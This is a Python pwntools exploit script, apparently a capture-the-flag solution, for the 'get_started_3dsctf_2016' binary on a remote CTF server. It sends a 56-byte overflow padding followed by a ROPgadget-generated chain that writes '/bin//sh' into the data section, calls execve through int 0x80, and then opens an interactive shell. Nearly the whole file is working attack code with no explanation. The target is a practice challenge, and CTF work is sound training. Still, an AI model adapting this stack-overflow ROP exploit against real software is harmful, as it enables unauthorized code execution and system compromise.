#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './get_started_3dsctf_2016'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_host  = 'node3.buuoj.cn'
remote_port = 29183

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'

# info
len = 56

# gadget
# execve generated by ROPgadget
# ROPgadget --binary ./get_started_3dsctf_2016 --ropchain --badbytes "0a"
from struct import pack
def ropchain():
	p = ''

	p += pack('<I', 0x0806fc30) # pop edx ; pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080eb060) # @ .data
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x080b91e6) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080557ab) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806fc30) # pop edx ; pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080eb064) # @ .data + 4
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x080b91e6) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080557ab) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806fc30) # pop edx ; pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x08049463) # xor eax, eax ; ret
	p += pack('<I', 0x080557ab) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481ad) # pop ebx ; ret
	p += pack('<I', 0x080eb060) # @ .data
	p += pack('<I', 0x0806fc31) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x080eb060) # padding without overwrite ebx
	p += pack('<I', 0x0806fc30) # pop edx ; pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x080eb068) # padding without overwrite ecx
	p += pack('<I', 0x080eb060) # padding without overwrite ebx
	p += pack('<I', 0x08049463) # xor eax, eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0807b1ef) # inc eax ; ret
	p += pack('<I', 0x0806d7e5) # int 0x80
	return p

# elf, libc

# rop1
payload = 'A'*56
payload += ropchain()
log.hexdump(ropchain())

# p.recvuntil('Qual a palavrinha magica? ')
# gdb.attach(p)
p.sendline(payload)

# log.info('')
# log.warning('--------------')

p.interactive()

